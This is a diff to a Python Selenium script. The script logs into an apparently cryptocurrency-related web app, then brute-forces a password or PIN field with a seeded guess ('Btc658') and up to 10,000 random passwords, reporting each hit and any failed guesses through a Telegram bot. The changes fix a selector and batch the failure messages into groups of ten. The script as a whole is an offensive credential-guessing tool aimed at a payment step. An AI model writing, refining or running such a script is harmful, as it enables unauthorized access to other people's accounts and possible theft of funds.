@@ -13,7 +13,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 bot = telebot.TeleBot(BOT_TOKEN)
 
-
 initial_password = "Btc658"
 
 def generate_password(length=6):
@@ -41,7 +40,7 @@ def main():
         time.sleep(5)
 
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("USERNAME"))
-        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("PASSWORD"))
+        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(os.getenv("PASSWORD"))
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[6]/uni-button').click()
         time.sleep(6)
         send_log("✅ Logged in successfully.")
@@ -51,6 +50,8 @@ def main():
         driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")
 
         passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(10000)]
+        wrong_count = 0
+        wrong_passwords_batch = []
 
         for pwd in passwords:
             try:
@@ -63,10 +64,16 @@ def main():
                 current_url = driver.current_url
                 if "rechargePay?sn=" in current_url:
                     send_log(f"✅ Password correct: {pwd}\nURL: {current_url}")
-                    break  # stop trying
+                    break
 
-                # Send wrong password update anyway
-                send_log(f"❌ Wrong password: {pwd}")
+                wrong_passwords_batch.append(pwd)
+                wrong_count += 1
+
+                if wrong_count >= 10:
+                    batch_text = "\n".join(wrong_passwords_batch)
+                    send_log(f"❌ 10 wrong passwords tried:\n{batch_text}")
+                    wrong_count = 0
+                    wrong_passwords_batch = []
 
             except Exception as e:
                 send_log(f"⚠️ Error while testing password '{pwd}': {e}")
